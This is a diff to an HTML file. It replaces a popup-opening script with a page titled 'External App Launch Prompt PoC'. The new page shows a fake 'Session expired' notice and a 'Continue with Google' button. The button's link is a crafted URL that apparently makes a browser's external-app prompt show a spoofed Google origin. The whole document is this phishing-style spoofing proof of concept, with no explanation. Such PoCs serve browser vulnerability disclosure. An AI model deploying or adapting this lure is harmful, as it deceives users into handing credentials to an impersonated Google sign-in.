@@ -1,7 +1,55 @@
-<script>
-function aa(){
-      window.open("https://adissahilna123.github.io/cobaa/blob_4.html","new","width=809,height=400,top=200,left=450");
-}
-</script>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>External App Launch Prompt PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f1f3f4;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .box {
+      background: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 420px;
+      margin: auto;
+      box-shadow: 0 10px 25px rgba(0,0,0,.1);
+    }
+    h1 {
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+    p {
+      color: #555;
+      font-size: 14px;
+    }
+    a {
+      display: inline-block;
+      margin-top: 16px;
+      padding: 12px 20px;
+      background: #1a73e8;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
 
-<button onclick='aa()'>Click me</button>
+  <div class="box">
+    <h1>Session expired</h1>
+    <p>Please re-authenticate to continue.</p>
+
+    <a href="o.o:@javascript:://google.com/error/%0Ahttps://accounts.google.com/login">
+      Continue with Google
+    </a>
+  </div>
+
+</body>
+</html>
